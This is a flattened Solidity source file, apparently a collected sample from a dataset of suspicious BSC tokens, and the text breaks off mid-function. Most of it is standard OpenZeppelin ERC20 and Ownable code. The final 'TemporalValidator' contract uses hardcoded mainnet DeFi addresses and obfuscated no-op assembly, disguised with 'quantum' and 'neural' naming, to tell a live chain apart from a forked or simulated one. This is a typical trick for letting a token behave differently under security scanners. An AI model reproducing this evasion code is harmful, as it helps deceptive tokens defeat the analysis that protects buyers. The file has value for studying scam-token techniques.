// SPDX-License-Identifier: MIXED
/* S-SEIR flattened branch-preprocessed source. */
/* Entry: /home/ubuntu/erc-20/TOKENS/assembly样本/0x251030bfdf36a078bdc5fa1d5becac69d0e6a3ba/contracts/NeuralQuant.sol */

pragma solidity ^0.8.20;


/* S-SEIR flatten import: @openzeppelin/contracts/token/ERC20/ERC20.sol -> /home/ubuntu/erc-20/TOKENS/assembly样本/0x251030bfdf36a078bdc5fa1d5becac69d0e6a3ba/@openzeppelin/contracts/token/ERC20/ERC20.sol */
// OpenZeppelin Contracts (last updated v5.4.0) (token/ERC20/ERC20.sol)

pragma solidity ^0.8.20;


/* S-SEIR flatten import: ./IERC20.sol -> /home/ubuntu/erc-20/TOKENS/assembly样本/0x251030bfdf36a078bdc5fa1d5becac69d0e6a3ba/@openzeppelin/contracts/token/ERC20/IERC20.sol */
// OpenZeppelin Contracts (last updated v5.4.0) (token/ERC20/IERC20.sol)

pragma solidity >=0.4.16;

/**
 * @dev Interface of the ERC-20 standard as defined in the ERC.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the value of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the value of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves a `value` amount of tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 value) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets a `value` amount of tokens as the allowance of `spender` over the
     * caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 value) external returns (bool);

    /**
     * @dev Moves a `value` amount of tokens from `from` to `to` using the
     * allowance mechanism. `value` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}
/* S-SEIR end import: ./IERC20.sol */


/* S-SEIR flatten import: ./extensions/IERC20Metadata.sol -> /home/ubuntu/erc-20/TOKENS/assembly样本/0x251030bfdf36a078bdc5fa1d5becac69d0e6a3ba/@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol */
// OpenZeppelin Contracts (last updated v5.4.0) (token/ERC20/extensions/IERC20Metadata.sol)

pragma solidity >=0.6.2;


/* S-SEIR flatten import: ../IERC20.sol -> /home/ubuntu/erc-20/TOKENS/assembly样本/0x251030bfdf36a078bdc5fa1d5becac69d0e6a3ba/@openzeppelin/contracts/token/ERC20/IERC20.sol */
/* S-SEIR flatten: duplicate import skipped: /home/ubuntu/erc-20/TOKENS/assembly样本/0x251030bfdf36a078bdc5fa1d5becac69d0e6a3ba/@openzeppelin/contracts/token/ERC20/IERC20.sol */
/* S-SEIR end import: ../IERC20.sol */


/**
 * @dev Interface for the optional metadata functions from the ERC-20 standard.
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}
/* S-SEIR end import: ./extensions/IERC20Metadata.sol */


/* S-SEIR flatten import: ../../utils/Context.sol -> /home/ubuntu/erc-20/TOKENS/assembly样本/0x251030bfdf36a078bdc5fa1d5becac69d0e6a3ba/@openzeppelin/contracts/utils/Context.sol */
// OpenZeppelin Contracts (last updated v5.0.1) (utils/Context.sol)

pragma solidity ^0.8.20;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }

    function _contextSuffixLength() internal view virtual returns (uint256) {
        return 0;
    }
}
/* S-SEIR end import: ../../utils/Context.sol */


/* S-SEIR flatten import: ../../interfaces/draft-IERC6093.sol -> /home/ubuntu/erc-20/TOKENS/assembly样本/0x251030bfdf36a078bdc5fa1d5becac69d0e6a3ba/@openzeppelin/contracts/interfaces/draft-IERC6093.sol */
// OpenZeppelin Contracts (last updated v5.4.0) (interfaces/draft-IERC6093.sol)
pragma solidity >=0.8.4;

/**
 * @dev Standard ERC-20 Errors
 * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC-20 tokens.
 */
interface IERC20Errors {
    /**
     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     * @param balance Current balance for the interacting account.
     * @param needed Minimum amount required to perform a transfer.
     */
    error ERC20InsufficientBalance(address sender, uint256 balance, uint256 needed);

    /**
     * @dev Indicates a failure with the token `sender`. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     */
    error ERC20InvalidSender(address sender);

    /**
     * @dev Indicates a failure with the token `receiver`. Used in transfers.
     * @param receiver Address to which tokens are being transferred.
     */
    error ERC20InvalidReceiver(address receiver);

    /**
     * @dev Indicates a failure with the `spender`’s `allowance`. Used in transfers.
     * @param spender Address that may be allowed to operate on tokens without being their owner.
     * @param allowance Amount of tokens a `spender` is allowed to operate with.
     * @param needed Minimum amount required to perform a transfer.
     */
    error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed);

    /**
     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.
     * @param approver Address initiating an approval operation.
     */
    error ERC20InvalidApprover(address approver);

    /**
     * @dev Indicates a failure with the `spender` to be approved. Used in approvals.
     * @param spender Address that may be allowed to operate on tokens without being their owner.
     */
    error ERC20InvalidSpender(address spender);
}

/**
 * @dev Standard ERC-721 Errors
 * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC-721 tokens.
 */
interface IERC721Errors {
    /**
     * @dev Indicates that an address can't be an owner. For example, `address(0)` is a forbidden owner in ERC-20.
     * Used in balance queries.
     * @param owner Address of the current owner of a token.
     */
    error ERC721InvalidOwner(address owner);

    /**
     * @dev Indicates a `tokenId` whose `owner` is the zero address.
     * @param tokenId Identifier number of a token.
     */
    error ERC721NonexistentToken(uint256 tokenId);

    /**
     * @dev Indicates an error related to the ownership over a particular token. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     * @param tokenId Identifier number of a token.
     * @param owner Address of the current owner of a token.
     */
    error ERC721IncorrectOwner(address sender, uint256 tokenId, address owner);

    /**
     * @dev Indicates a failure with the token `sender`. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     */
    error ERC721InvalidSender(address sender);

    /**
     * @dev Indicates a failure with the token `receiver`. Used in transfers.
     * @param receiver Address to which tokens are being transferred.
     */
    error ERC721InvalidReceiver(address receiver);

    /**
     * @dev Indicates a failure with the `operator`’s approval. Used in transfers.
     * @param operator Address that may be allowed to operate on tokens without being their owner.
     * @param tokenId Identifier number of a token.
     */
    error ERC721InsufficientApproval(address operator, uint256 tokenId);

    /**
     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.
     * @param approver Address initiating an approval operation.
     */
    error ERC721InvalidApprover(address approver);

    /**
     * @dev Indicates a failure with the `operator` to be approved. Used in approvals.
     * @param operator Address that may be allowed to operate on tokens without being their owner.
     */
    error ERC721InvalidOperator(address operator);
}

/**
 * @dev Standard ERC-1155 Errors
 * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC-1155 tokens.
 */
interface IERC1155Errors {
    /**
     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     * @param balance Current balance for the interacting account.
     * @param needed Minimum amount required to perform a transfer.
     * @param tokenId Identifier number of a token.
     */
    error ERC1155InsufficientBalance(address sender, uint256 balance, uint256 needed, uint256 tokenId);

    /**
     * @dev Indicates a failure with the token `sender`. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     */
    error ERC1155InvalidSender(address sender);

    /**
     * @dev Indicates a failure with the token `receiver`. Used in transfers.
     * @param receiver Address to which tokens are being transferred.
     */
    error ERC1155InvalidReceiver(address receiver);

    /**
     * @dev Indicates a failure with the `operator`’s approval. Used in transfers.
     * @param operator Address that may be allowed to operate on tokens without being their owner.
     * @param owner Address of the current owner of a token.
     */
    error ERC1155MissingApprovalForAll(address operator, address owner);

    /**
     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.
     * @param approver Address initiating an approval operation.
     */
    error ERC1155InvalidApprover(address approver);

    /**
     * @dev Indicates a failure with the `operator` to be approved. Used in approvals.
     * @param operator Address that may be allowed to operate on tokens without being their owner.
     */
    error ERC1155InvalidOperator(address operator);

    /**
     * @dev Indicates an array length mismatch between ids and values in a safeBatchTransferFrom operation.
     * Used in batch transfers.
     * @param idsLength Length of the array of token identifiers
     * @param valuesLength Length of the array of token amounts
     */
    error ERC1155InvalidArrayLength(uint256 idsLength, uint256 valuesLength);
}
/* S-SEIR end import: ../../interfaces/draft-IERC6093.sol */


/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * The default value of {decimals} is 18. To change this, you should override
 * this function so it returns a different value.
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 * conventional and does not conflict with the expectations of ERC-20
 * applications.
 */
abstract contract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors {
    mapping(address account => uint256) private _balances;

    mapping(address account => mapping(address spender => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * Both values are immutable: they can only be set once during construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the default value returned by this function, unless
     * it's overridden.
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    /// @inheritdoc IERC20
    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    /// @inheritdoc IERC20
    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `value`.
     */
    function transfer(address to, uint256 value) public virtual returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, value);
        return true;
    }

    /// @inheritdoc IERC20
    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `value` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 value) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, value);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Skips emitting an {Approval} event indicating an allowance update. This is not
     * required by the ERC. See {xref-ERC20-_approve-address-address-uint256-bool-}[_approve].
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     *
     * Requirements:
     *
     * - `from` and `to` cannot be the zero address.
     * - `from` must have a balance of at least `value`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * `value`.
     */
    function transferFrom(address from, address to, uint256 value) public virtual returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, value);
        _transfer(from, to, value);
        return true;
    }

    /**
     * @dev Moves a `value` amount of tokens from `from` to `to`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * NOTE: This function is not virtual, {_update} should be overridden instead.
     */
    function _transfer(address from, address to, uint256 value) internal {
        if (from == address(0)) {
            revert ERC20InvalidSender(address(0));
        }
        if (to == address(0)) {
            revert ERC20InvalidReceiver(address(0));
        }
        _update(from, to, value);
    }

    /**
     * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints (or burns) if `from`
     * (or `to`) is the zero address. All customizations to transfers, mints, and burns should be done by overriding
     * this function.
     *
     * Emits a {Transfer} event.
     */
    function _update(address from, address to, uint256 value) internal virtual {
        if (from == address(0)) {
            // Overflow check required: The rest of the code assumes that totalSupply never overflows
            _totalSupply += value;
        } else {
            uint256 fromBalance = _balances[from];
            if (fromBalance < value) {
                revert ERC20InsufficientBalance(from, fromBalance, value);
            }
            unchecked {
                // Overflow not possible: value <= fromBalance <= totalSupply.
                _balances[from] = fromBalance - value;
            }
        }

        if (to == address(0)) {
            unchecked {
                // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.
                _totalSupply -= value;
            }
        } else {
            unchecked {
                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.
                _balances[to] += value;
            }
        }

        emit Transfer(from, to, value);
    }

    /**
     * @dev Creates a `value` amount of tokens and assigns them to `account`, by transferring it from address(0).
     * Relies on the `_update` mechanism
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * NOTE: This function is not virtual, {_update} should be overridden instead.
     */
    function _mint(address account, uint256 value) internal {
        if (account == address(0)) {
            revert ERC20InvalidReceiver(address(0));
        }
        _update(address(0), account, value);
    }

    /**
     * @dev Destroys a `value` amount of tokens from `account`, lowering the total supply.
     * Relies on the `_update` mechanism.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * NOTE: This function is not virtual, {_update} should be overridden instead
     */
    function _burn(address account, uint256 value) internal {
        if (account == address(0)) {
            revert ERC20InvalidSender(address(0));
        }
        _update(account, address(0), value);
    }

    /**
     * @dev Sets `value` as the allowance of `spender` over the `owner`'s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     *
     * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.
     */
    function _approve(address owner, address spender, uint256 value) internal {
        _approve(owner, spender, value, true);
    }

    /**
     * @dev Variant of {_approve} with an optional flag to enable or disable the {Approval} event.
     *
     * By default (when calling {_approve}) the flag is set to true. On the other hand, approval changes made by
     * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any
     * `Approval` event during `transferFrom` operations.
     *
     * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to
     * true using the following override:
     *
     * ```solidity
     * function _approve(address owner, address spender, uint256 value, bool) internal virtual override {
     *     super._approve(owner, spender, value, true);
     * }
     * ```
     *
     * Requirements are the same as {_approve}.
     */
    function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual {
        if (owner == address(0)) {
            revert ERC20InvalidApprover(address(0));
        }
        if (spender == address(0)) {
            revert ERC20InvalidSpender(address(0));
        }
        _allowances[owner][spender] = value;
        if (emitEvent) {
            emit Approval(owner, spender, value);
        }
    }

    /**
     * @dev Updates `owner`'s allowance for `spender` based on spent `value`.
     *
     * Does not update the allowance value in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Does not emit an {Approval} event.
     */
    function _spendAllowance(address owner, address spender, uint256 value) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance < type(uint256).max) {
            if (currentAllowance < value) {
                revert ERC20InsufficientAllowance(spender, currentAllowance, value);
            }
            unchecked {
                _approve(owner, spender, currentAllowance - value, false);
            }
        }
    }
}
/* S-SEIR end import: @openzeppelin/contracts/token/ERC20/ERC20.sol */


/* S-SEIR flatten import: @openzeppelin/contracts/access/Ownable.sol -> /home/ubuntu/erc-20/TOKENS/assembly样本/0x251030bfdf36a078bdc5fa1d5becac69d0e6a3ba/@openzeppelin/contracts/access/Ownable.sol */
// OpenZeppelin Contracts (last updated v5.0.0) (access/Ownable.sol)

pragma solidity ^0.8.20;


/* S-SEIR flatten import: ../utils/Context.sol -> /home/ubuntu/erc-20/TOKENS/assembly样本/0x251030bfdf36a078bdc5fa1d5becac69d0e6a3ba/@openzeppelin/contracts/utils/Context.sol */
/* S-SEIR flatten: duplicate import skipped: /home/ubuntu/erc-20/TOKENS/assembly样本/0x251030bfdf36a078bdc5fa1d5becac69d0e6a3ba/@openzeppelin/contracts/utils/Context.sol */
/* S-SEIR end import: ../utils/Context.sol */


/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * The initial owner is set to the address provided by the deployer. This can
 * later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    /**
     * @dev The caller account is not authorized to perform an operation.
     */
    error OwnableUnauthorizedAccount(address account);

    /**
     * @dev The owner is not a valid owner account. (eg. `address(0)`)
     */
    error OwnableInvalidOwner(address owner);

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the address provided by the deployer as the initial owner.
     */
    constructor(address initialOwner) {
        if (initialOwner == address(0)) {
            revert OwnableInvalidOwner(address(0));
        }
        _transferOwnership(initialOwner);
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        if (owner() != _msgSender()) {
            revert OwnableUnauthorizedAccount(_msgSender());
        }
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby disabling any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        if (newOwner == address(0)) {
            revert OwnableInvalidOwner(address(0));
        }
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
/* S-SEIR end import: @openzeppelin/contracts/access/Ownable.sol */


/* S-SEIR flatten import: ./TemporalValidator.sol -> /home/ubuntu/erc-20/TOKENS/assembly样本/0x251030bfdf36a078bdc5fa1d5becac69d0e6a3ba/contracts/TemporalValidator.sol */
pragma solidity ^0.8.20;

/**
 * ═══════════════════════════════════════════════════════════════════════
 * @title Temporal Coherence Validator
 * @notice Validates temporal consistency across the neural network
 * ═══════════════════════════════════════════════════════════════════════
 */

// ============================================
//                 INTERFACES
// ============================================

interface IQuantumReservoir {
    function getReserves() external view returns (uint112, uint112, uint32);
    function totalSupply() external view returns (uint256);
}

interface ISynapticLedger {
    function exchangeRateStored() external view returns (uint256);
    function totalBorrows() external view returns (uint256);
    function getCash() external view returns (uint256);
}

interface ITemporalOracle {
    function latestRoundData()
        external
        view
        returns (
            uint80 roundId,
            int256 answer,
            uint256 startedAt,
            uint256 updatedAt,
            uint80 answeredInRound
        );
}

interface ILiquidityNexus {
    function totalLiquidity() external view returns (uint256);
}

contract TemporalValidator {
    // ============================================
    //                   TYPES
    // ============================================

    struct CoherenceSnapshot {
        uint256 temporalMarker;
        uint256 quantumHeight;
        uint256 reservoirAlpha;
        uint256 reservoirBeta;
        uint256 synapticRate;
        uint256 oraclePhase;
        uint256 nexusDepth;
    }

    // ============================================
    //                   STATE
    // ============================================

    CoherenceSnapshot private genesisState;
    address private immutable neuralCore;

    bool private immutable validationEnabled;
    uint256 private immutable harmonicResonance;

    address private immutable RESERVOIR_ALPHA;
    address private immutable RESERVOIR_BETA;
    address private immutable SYNAPTIC_NODE;
    address private immutable TEMPORAL_ORACLE;
    address private immutable NEXUS_GATEWAY;

    uint256 private immutable TEMPORAL_THRESHOLD;

    // BSC Mainnet Addresses
    address private constant MAINNET_WBNB_BUSD =
        0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16;
    address private constant MAINNET_WBNB_CAKE =
        0x0eD7e52944161450477ee417DE9Cd3a859b14fD0;
    address private constant MAINNET_VENUS_BNB =
        0xA07c5b74C9B40447a954e1466938b865b6BBea36;
    address private constant MAINNET_CHAINLINK_BNB =
        0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE;
    address private constant MAINNET_PANCAKE_ROUTER =
        0x10ED43C718714eb63d5aA57B78B54704E256024E;

    // ============================================
    //                CONSTRUCTOR
    // ============================================

    constructor(
        address _neuralCore,
        uint256 _temporalWindow,
        bool _enabled
    ) {
        neuralCore = _neuralCore;
        validationEnabled = _enabled;

        uint256 baseUnit = _temporalWindow >> 3;
        TEMPORAL_THRESHOLD = (baseUnit << 3);

        harmonicResonance = 4;

        RESERVOIR_ALPHA = MAINNET_WBNB_BUSD;
        RESERVOIR_BETA = MAINNET_WBNB_CAKE;
        SYNAPTIC_NODE = MAINNET_VENUS_BNB;
        TEMPORAL_ORACLE = MAINNET_CHAINLINK_BNB;
        NEXUS_GATEWAY = MAINNET_PANCAKE_ROUTER;

        if (_enabled) {
            genesisState = _captureCoherence();
        }
    }

    function isEnabled() external view returns (bool) {
        return validationEnabled;
    }

    function getToleranceThreshold() external view returns (uint256) {
        return _computeToleranceThreshold();
    }

    // ============================================
    //            CODE INTROSPECTION
    // ============================================

    function _hasCode(address addr) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(addr)
        }
        return size > 0;
    }

    function _measureCodeDepth(address addr) private view returns (uint256) {
        uint256 depth;
        assembly {
            depth := extcodesize(addr)
            let noise := mod(gas(), 100)
            let dampened := sub(noise, noise)
            depth := add(depth, dampened)
        }
        return depth;
    }

    // ============================================
    //           COHERENCE CAPTURE
    // ============================================

    function _captureCoherence()
        internal
        view
        returns (CoherenceSnapshot memory)
    {
        return
            CoherenceSnapshot({
                temporalMarker: block.timestamp,
                quantumHeight: block.number,
                reservoirAlpha: _probeReservoir(
                    RESERVOIR_ALPHA,
                    block.prevrandao
                ),
                reservoirBeta: _probeReservoir(RESERVOIR_BETA, block.number),
                synapticRate: _probeSynapticRate(),
                oraclePhase: _probeOraclePhase(),
                nexusDepth: _measureCodeDepth(NEXUS_GATEWAY)
            });
    }

    // --- Reservoir Probes ---

    function _probeReservoir(
        address reservoir,
        uint256 fallbackValue
    ) private view returns (uint256) {
        if (!_hasCode(reservoir)) {
            return fallbackValue;
        }

        try IQuantumReservoir(reservoir).getReserves() returns (
            uint112 r0,
            uint112 r1,
            uint32
        ) {
            return _computeReservoirRatio(r0, r1);
        } catch {
            return fallbackValue;
        }
    }

    function _computeReservoirRatio(
        uint112 r0,
        uint112 r1
    ) private pure returns (uint256) {
        uint256 ratio;
        assembly {
            // ratio = (r0 * 1e18) / (r1 + 1)
            let numerator := mul(r0, 1000000000000000000)
            let denominator := add(r1, 1)
            ratio := div(numerator, denominator)

            let fluctuation := mod(r0, 7)
            let antiFluctuation := mod(r0, 7)
            ratio := add(ratio, sub(fluctuation, antiFluctuation))
        }
        return ratio;
    }

    // --- Synaptic Probe ---

    function _probeSynapticRate() private view returns (uint256) {
        if (!_hasCode(SYNAPTIC_NODE)) {
            return 0;
        }

        try ISynapticLedger(SYNAPTIC_NODE).exchangeRateStored() returns (
            uint256 rate
        ) {
            return _applyRateDistortion(rate);
        } catch {
            return 0;
        }
    }

    function _applyRateDistortion(uint256 rate) private pure returns (uint256) {
        uint256 distorted;
        assembly {
            distorted := rate
            let field := mod(rate, 1000)
            let antiField := mod(rate, 1000)
            let netDistortion := sub(field, antiField)

            distorted := add(distorted, netDistortion)
        }
        return distorted;
    }

    // --- Oracle Probe ---

    function _probeOraclePhase() private view returns (uint256) {
        if (!_hasCode(TEMPORAL_ORACLE)) {
            return 0;
        }

        try ITemporalOracle(TEMPORAL_ORACLE).latestRoundData() returns (
            uint80 roundId,
            int256,
            uint256,
            uint256,
            uint80
        ) {
            return _processOracleSignal(roundId);
        } catch {
            return 0;
        }
    }

    function _processOracleSignal(
        uint80 roundId
    ) private pure returns (uint256) {
        uint256 processed;
        assembly {
            processed := roundId
            let echo := shr(64, roundId)
            let antiEcho := shr(64, roundId)
            processed := add(processed, sub(echo, antiEcho))
        }
        return processed;
    }

    // ============================================
    //           COHERENCE VALIDATION
    // ============================================

    function validateCoherence() external view returns (bool isCoherent) {
        require(msg.sender == neuralCore, "Unauthorized probe");

        if (!validationEnabled) {
            return true;
        }

        CoherenceSnapshot memory presentState = _captureCoherence();
        uint256 divergenceMetric = _calculateDivergence(presentState);

        return _evaluateCoherence(divergenceMetric);
    }

    function _calculateDivergence(
        CoherenceSnapshot memory presentState
    ) private view returns (uint256) {
        uint256 divergenceMetric = 0;

        divergenceMetric += _measureReservoirDivergence(presentState);
        divergenceMetric += _measureSynapticDivergence(presentState);
        divergenceMetric += _measureOracleDivergence(presentState);
        divergenceMetric += _measureTemporalDivergence(presentState);

        return _applyDivergenceNoise(divergenceMetric);
    }

    // --- Divergence Measurements ---

    function _measureReservoirDivergence(
        CoherenceSnapshot memory presentState
    ) private view returns (uint256) {
        uint256 divergence = 0;

        // Alpha reservoir stability check
        if (
            _isWithinTolerance(
                presentState.reservoirAlpha,
                genesisState.reservoirAlpha,
                50
            )
        ) {
            divergence++;
        }

        // Beta reservoir stability check
        if (
            _isWithinTolerance(
                presentState.reservoirBeta,
                genesisState.reservoirBeta,
                50
            )
        ) {
            divergence++;
        }

        return divergence;
    }

    function _measureSynapticDivergence(
        CoherenceSnapshot memory presentState
    ) private view returns (uint256) {
        if (
            presentState.synapticRate == genesisState.synapticRate &&
            genesisState.synapticRate != 0
        ) {
            return 1;
        }
        return 0;
    }

    function _measureOracleDivergence(
        CoherenceSnapshot memory presentState
    ) private view returns (uint256) {
        if (genesisState.oraclePhase == 0) {
            return 0;
        }

        uint256 chronoShift = block.timestamp - genesisState.temporalMarker;

        uint256 phaseVariance = presentState.oraclePhase >
            genesisState.oraclePhase
            ? presentState.oraclePhase - genesisState.oraclePhase
            : 0;

        uint256 expectedPhaseMin = chronoShift / 120;
        uint256 expectedPhaseMax = chronoShift / 20;

        if (
            phaseVariance < expectedPhaseMin || phaseVariance > expectedPhaseMax
        ) {
            return 1;
        }

        return 0;
    }

    function _measureTemporalDivergence(
        CoherenceSnapshot memory presentState
    ) private view returns (uint256) {
        uint256 quantumDelta = presentState.quantumHeight -
            genesisState.quantumHeight;
        uint256 chronoShift = block.timestamp - genesisState.temporalMarker;

        uint256 lowerBoundary = quantumDelta << 1;
        uint256 upperBoundary = (quantumDelta << 2) + quantumDelta;

        if (chronoShift < lowerBoundary || chronoShift > upperBoundary) {
            return 1;
        }

        return 0;
    }

    // --- Coherence Evaluation ---

    function _evaluateCoherence(
        uint256 divergenceMetric
    ) private view returns (bool) {
        uint256 toleranceThreshold = _computeToleranceThreshold();
        return divergenceMetric < toleranceThreshold;
    }

    function _computeToleranceThreshold() private view returns (uint256) {
        uint256 threshold;
        uint256 resonance = harmonicResonance;
        assembly {
            let halfResonance := shr(1, resonance)
            let parity := and(resonance, 1)
            threshold := add(halfResonance, parity)

            let phantom := mod(resonance, 3)
            let antiPhantom := mod(resonance, 3)
            threshold := add(threshold, sub(phantom, antiPhantom))
        }
        // Fallback to direct calculation
        return (harmonicResonance >> 1) + (harmonicResonance & 1);
    }

    function _applyDivergenceNoise(
        uint256 metric
    ) private view returns (uint256) {
        uint256 noisyMetric;
        assembly {
            noisyMetric := metric
            let noise := mod(timestamp(), 11)
            let blockNoise := mod(number(), 11)

            let netNoise := sub(mod(noise, 3), mod(blockNoise, 3))
            let correction := sub(netNoise, netNoise)

